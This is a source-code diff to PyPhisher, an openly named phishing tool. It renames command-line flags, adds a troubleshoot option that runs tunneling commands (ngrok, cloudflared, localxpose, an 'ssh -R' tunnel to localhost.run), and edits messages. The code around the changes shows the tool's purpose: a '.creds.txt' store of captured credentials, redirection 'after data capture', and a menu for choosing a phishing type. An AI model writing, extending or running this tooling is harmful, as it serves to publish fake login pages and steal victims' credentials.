@@ -37,7 +37,6 @@ AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
 SOFTWARE.
-
 """
 
 from argparse import ArgumentParser
@@ -265,7 +264,6 @@ if isdir("/data/data/com.termux/files/home"):
 else:
     termux = False
     saved_file = f"{home}/.creds.txt"
-    
 
 
 print(f"\n{info}Please wait!{nc}")
@@ -274,11 +272,12 @@ argparser = ArgumentParser()
 
 argparser.add_argument("-p", "--port", type=int, default=default_port, help=f"PyPhisher's server port [Default : {default_port}]")
 argparser.add_argument("-o", "--option", help="PyPhisher's template index [Default : null]")
-argparser.add_argument("-T", "--tunneler", default=default_tunneler, help=f"Tunneler to be chosen while url shortening [Default : {default_tunneler}]")
+argparser.add_argument("-t", "--tunneler", default=default_tunneler, help=f"Tunneler to be chosen while url shortening [Default : {default_tunneler}]")
 argparser.add_argument("-r", "--region", help="Region for ngrok and loclx [Default: auto]")
-argparser.add_argument("-S", "--subdomain", help="Subdomain for ngrok and loclx [Pro Account] (Default: null)")
+argparser.add_argument("-s", "--subdomain", help="Subdomain for ngrok and loclx [Pro Account] (Default: null)")
 argparser.add_argument("-u", "--url", help="Redirection url after data capture [Default : null]")
 argparser.add_argument("-m", "--mode", help="Mode of PyPhisher [Default: normal]")
+argparser.add_argument("-e", "--troubleshoot", help="Troubleshoot a tunneler [Default: null]")
 argparser.add_argument("--nokey", help="Use localtunnel without ssh key [Default: False]", action="store_false")
 argparser.add_argument("--noupdate", help="Skip update checking [Default : False]", action="store_false")
 
@@ -292,10 +291,22 @@ subdomain = args.subdomain
 tunneler = args.tunneler
 url = args.url
 mode = args.mode
+troubleshoot = args.troubleshoot
 key = args.nokey if mode != "test" else False
 update = args.noupdate
 
 local_url = f"127.0.0.1:{port}"
+
+ts_commands = {
+    "ngrok": f"{nr_command} http {port}",
+    "cloudflared": f"{cf_command} tunnel -url {local_url}",
+    "localxpose": f"{lx_command} tunnel http -t {local_url}",
+    "localhostrun": f"ssh -R 80:{local_url} localhost.run -T -n",
+    "cf": f"{cf_command} tunnel -url {local_url}",
+    "loclx": f"{lx_command} tunnel http -t {local_url}",
+    "lhr": f"ssh -R 80:{local_url} localhost.run -T -n"
+}
+
 
 # My utility functions
 
@@ -1122,17 +1133,21 @@ def requirements():
         if "@gmail.com" in email:
             is_mail_ok = True
         else:
-            print(f"\n{error}Only gmail with app password is allowed")
+            print(f"\n{error}Only gmail with app password is allowed!{nc}")
             sleep(1)
 
 # Main Menu to choose phishing type
 
 def main_menu():
-    global mode, option, mask, url, redir_url
+    global mode, option, mask, troubleshoot, url, redir_url
     shell("stty -echoctl") # Skip printing ^C
     if update:
         updater()
     requirements()
+    if troubleshoot in ts_commands:
+        command = ts_commands[troubleshoot]
+        shell(command)
+        pexit()
     tempdata = cat(templates_file)
     if is_json(tempdata):
         sites = parse(tempdata)
@@ -1284,7 +1299,7 @@ def server():
     if nr_success or cf_success or lx_success or lhr_success:
         sprint(f"\n{info}Your urls are given below:\n")
         if mode == "test":
-            print(f"\n{info}URL Generation completed successfully!")
+            print(f"\n{info}URL generation has completed successfully!")
             print(f"\n{info}Ngrok: {nr_success}, CloudFlared: {cf_success}, LocalXpose: {lx_success}, LocalHR: {lhr_success}")
             pexit()
         if nr_success:
